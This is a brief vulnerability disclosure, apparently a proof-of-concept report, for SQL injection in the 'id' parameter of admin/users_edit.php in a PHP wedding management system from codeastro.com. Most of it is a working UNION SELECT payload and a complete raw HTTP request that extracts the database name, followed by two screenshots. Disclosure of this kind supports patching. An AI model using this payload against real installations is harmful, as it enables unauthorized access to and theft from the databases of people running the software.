# Wedding Management System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\users_edit.php

Vulnerability location: /Wedding-Management/admin/users_edit.php?id=, id

[+] Payload: id=-8%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/users_edit.php?id=-8%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167984768-2a9258f8-ba73-4244-bfc4-9557f0b8d35a.png)

![image](https://user-images.githubusercontent.com/54017627/167984775-2fd88145-e703-487b-b3cb-6fbb55a6f904.png)
